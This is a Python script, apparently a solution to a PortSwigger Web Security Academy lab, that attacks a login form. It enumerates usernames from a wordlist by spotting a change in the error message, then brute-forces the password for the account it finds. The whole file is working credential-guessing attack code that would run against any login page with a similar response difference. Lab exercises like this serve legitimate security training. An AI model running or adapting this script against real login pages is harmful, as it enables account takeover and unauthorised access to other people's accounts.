import requests 
from bs4 import BeautifulSoup

url = 'https://acf31f321e08d36ec0b01df700f600dd.web-security-academy.net/login'
section = '''<section>
<p class="is-warning">Invalid username or password.</p>
<form action="/login" class="login-form" method="POST">
<label>Username</label>
<input name="username" required="" type="username"/>
<label>Password</label>
<input name="password" required="" type="password"/>
<button class="button" type="submit"> Log in </button>
</form>
</section>'''

def getUsername():
    usernames = open('../../wordlist/username.txt')

    for username in usernames:
        response = requests.post(url, data={
            'username': username.replace('\n', ''),
            'password': 'whatever'
        })

        # soup = BeautifulSoup(response.text, 'html.parser')

        # if str(soup.find_all('section')[3]) != section:
        #     print(username)
        #     break
        
        if 'Invalid username or password.' not in response.text:
            print(username)
            break

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, data={
            'username': 'albuquerque',
            'password': password.replace('\n', '')
        })

        if 'Invalid username or password' not in response.text:
            print(password)
            break

getPassword()